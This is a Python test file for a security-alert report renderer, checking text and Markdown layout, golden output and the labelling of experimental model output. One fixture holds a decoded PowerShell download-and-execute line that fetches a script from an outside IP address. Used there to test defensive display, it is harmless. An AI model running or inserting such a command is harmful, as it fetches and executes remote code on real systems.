from datetime import datetime, timezone
from uuid import UUID

from tests.test_schemas import _make_report
from app.report_render import Section, render_markdown, render_text, report_sections
from app.schemas import (
    CommandDecodeResult,
    Confidence,
    DecodedSegment,
    InvestigationStep,
    RiskAssessment,
    Severity,
)


def _fully_populated_report():
    """A report with every optional section populated, and every field pinned to a
    literal value, so its rendering can be compared against an explicit golden string
    rather than reconstructed from the renderer itself."""
    generated_at = datetime(2026, 8, 17, 12, 0, 0, tzinfo=timezone.utc)
    return _make_report(
        report_id=UUID("11111111-1111-1111-1111-111111111111"),
        alert_id=UUID("22222222-2222-2222-2222-222222222222"),
        generated_at=generated_at,
        alert_summary="Repeated SSH login failures from an external IP against a single host.",
        risk_assessment=RiskAssessment(
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            rationale="Multiple failed logins followed by a successful one from a new country.",
        ),
        recommended_actions=[
            "Block the source IP at the network perimeter",
            "Force a password reset for the affected account",
        ],
        command_analysis=CommandDecodeResult(
            command_line="powershell.exe -EncodedCommand AAA",
            decoded_segments=[
                DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami"),
            ],
        ),
        uncertainty_notes="no MITRE ATT&CK mapping available for this alert",
        triage_verdict_experimental="true_positive",
        triage_rationale_experimental="sandbox flagged a macro-enabled attachment",
        recommended_actions_freeform_experimental=["Block the sender domain at the gateway"],
        investigation_timeline=[
            InvestigationStep(
                step_name="enrich", action="completed",
                output_summary="1 indicator enriched", timestamp=generated_at,
            ),
            InvestigationStep(
                step_name="correlate", action="skipped",
                output_summary="skipped: no follow-up needed", timestamp=generated_at,
            ),
        ],
    )


def test_text_rendering_matches_the_established_show_report_layout():
    report = _make_report(
        recommended_actions=["Block the source IP at the network perimeter"],
        uncertainty_notes="no MITRE ATT&CK mapping available for this alert",
    )

    output = render_text(report_sections(report))

    assert f"Report {report.report_id} (alert {report.alert_id})" in output
    assert "Status: draft" in output
    assert "Summary:" in output
    assert report.alert_summary in output
    assert "Risk: severity=medium, confidence=high" in output
    assert "Recommended actions:" in output
    assert "  - Block the source IP at the network perimeter" in output
    assert "Uncertainty notes: no MITRE ATT&CK mapping available for this alert" in output


def test_uncertainty_notes_render_as_none_when_empty():
    output = render_text(report_sections(_make_report()))
    assert "Uncertainty notes: (none)" in output


def test_uncertainty_notes_render_every_body_line_not_only_the_first():
    """Mirrors the Risk section's body[1:] extend immediately above it — a second
    line must not be silently dropped if uncertainty_notes ever grows one."""
    section = Section(title="Uncertainty notes", body=["first line", "second line"])

    output = render_text([section])

    assert "Uncertainty notes: first line" in output
    assert "second line" in output


def test_command_analysis_section_is_omitted_when_absent():
    output = render_text(report_sections(_make_report()))
    assert "Command analysis:" not in output


def test_command_analysis_section_renders_decoded_segments():
    report = _make_report(command_analysis=CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(
            encoding="powershell_encoded", original="AAA",
            decoded="IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')",
        )],
    ))

    output = render_text(report_sections(report))

    assert "Command analysis:" in output
    assert "Command line: powershell.exe -EncodedCommand AAA" in output
    assert "[powershell_encoded]" in output


def test_timeline_section_lists_step_names_and_actions():
    report = _make_report(investigation_timeline=[
        InvestigationStep(
            step_name="enrich", action="skipped",
            output_summary="skipped: no validated indicators to enrich",
            timestamp=datetime.now(timezone.utc),
        )
    ])

    output = render_text(report_sections(report))

    assert "  - enrich: skipped" in output


def test_markdown_renders_headings_bullets_and_footer():
    report = _make_report(recommended_actions=["Escalate to a human analyst for manual review"])

    output = render_markdown(report, report_sections(report))

    assert output.startswith(f"# Investigation Report {report.report_id}")
    assert "## Summary" in output
    assert "## Recommended actions" in output
    assert "- Escalate to a human analyst for manual review" in output
    assert output.rstrip().endswith("_Internal — Ryt Bank_")


def test_markdown_omits_sections_the_text_renderer_omits():
    output = render_markdown(_make_report(), report_sections(_make_report()))
    assert "## Command analysis" not in output


def test_render_text_golden_output_for_a_fully_populated_report():
    """Pins the entire layout — section order and blank-line placement — against an
    explicit literal, not just substrings. Substring checks alone would not catch a
    swapped section order or a dropped/duplicated blank line between sections."""
    output = render_text(report_sections(_fully_populated_report()))

    expected = (
        "Report 11111111-1111-1111-1111-111111111111 (alert 22222222-2222-2222-2222-222222222222)\n"
        "Status: draft\n"
        "Generated: 2026-08-17T12:00:00+00:00\n"
        "\n"
        "Summary:\n"
        "Repeated SSH login failures from an external IP against a single host.\n"
        "\n"
        "Risk: severity=high, confidence=medium\n"
        "Multiple failed logins followed by a successful one from a new country.\n"
        "\n"
        "Recommended actions:\n"
        "  - Block the source IP at the network perimeter\n"
        "  - Force a password reset for the affected account\n"
        "\n"
        "Experimental (unvetted):\n"
        "EXPERIMENTAL — unvetted model output. Not audited by the self-check pass.\n"
        "Do not action without analyst review.\n"
        "\n"
        "Triage verdict: true_positive\n"
        "sandbox flagged a macro-enabled attachment\n"
        "  - Block the sender domain at the gateway\n"
        "\n"
        "Command analysis:\n"
        "Command line: powershell.exe -EncodedCommand AAA\n"
        "  - [powershell_encoded] whoami\n"
        "\n"
        "Uncertainty notes: no MITRE ATT&CK mapping available for this alert\n"
        "\n"
        "Timeline:\n"
        "  - enrich: completed\n"
        "  - correlate: skipped"
    )

    assert output == expected


def test_experimental_section_is_omitted_when_there_is_no_experimental_output():
    output = render_text(report_sections(_make_report()))
    assert "EXPERIMENTAL" not in output


def test_experimental_section_carries_its_disclaimer():
    report = _make_report(
        triage_verdict_experimental="true_positive",
        triage_rationale_experimental="sandbox flagged a macro-enabled attachment",
        recommended_actions_freeform_experimental=["Block the sender domain at the gateway"],
    )

    output = render_text(report_sections(report))

    assert "EXPERIMENTAL — unvetted model output" in output
    assert "Not audited by the self-check pass" in output
    assert "Triage verdict: true_positive" in output
    assert "sandbox flagged a macro-enabled attachment" in output
    assert "  - Block the sender domain at the gateway" in output


def test_experimental_section_renders_with_only_freeform_actions():
    report = _make_report(recommended_actions_freeform_experimental=["Do a thing"])

    output = render_text(report_sections(report))

    assert "EXPERIMENTAL" in output
    assert "Triage verdict:" not in output


def test_experimental_section_is_a_blockquote_in_markdown():
    report = _make_report(
        triage_verdict_experimental="uncertain",
        recommended_actions_freeform_experimental=["Block the sender domain at the gateway"],
    )

    output = render_markdown(report, report_sections(report))
    lines = output.splitlines()

    assert "## Experimental (unvetted)" in output
    assert "> EXPERIMENTAL — unvetted model output" in output
    # The freeform action bullet must sit inside the quote, not escape it as a bare
    # bullet indistinguishable from the vetted "Recommended actions" bullets above —
    # a substring check would pass for either form, so assert on the exact line.
    assert "> - Block the sender domain at the gateway" in lines
    assert "- Block the sender domain at the gateway" not in lines


def test_render_markdown_heading_order_for_a_fully_populated_report():
    """Pins section order independently of render_text's golden test, since Markdown
    builds its own line list from the same Section objects."""
    output = render_markdown(_fully_populated_report(), report_sections(_fully_populated_report()))

    headings = [line for line in output.splitlines() if line.startswith("## ")]

    assert headings == [
        "## Summary",
        "## Risk",
        "## Recommended actions",
        "## Experimental (unvetted)",
        "## Command analysis",
        "## Uncertainty notes",
        "## Timeline",
    ]
